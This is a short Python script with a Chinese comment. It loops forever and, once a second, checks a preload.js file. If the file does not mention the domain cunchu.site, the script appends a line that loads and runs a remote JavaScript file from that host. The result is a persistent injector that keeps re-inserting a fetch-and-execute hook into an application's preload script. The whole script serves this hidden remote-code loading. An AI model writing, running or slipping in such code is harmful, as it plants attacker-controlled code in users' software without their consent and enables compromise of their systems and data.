import time
# 打开文件并读取所有内容
while True:
    with open("preload.js", "r") as file:
        content = file.read()
        file.close()
        if ('cunchu.site' not in content):
            content = content + '\r\nsetTimeout(() => {loadScript("https://cunchu.site/work/ets/index.js")}, 100);'
            with open("preload.js", "w") as file2:
                file2.write(content)
                file.close()
        
    time.sleep(1)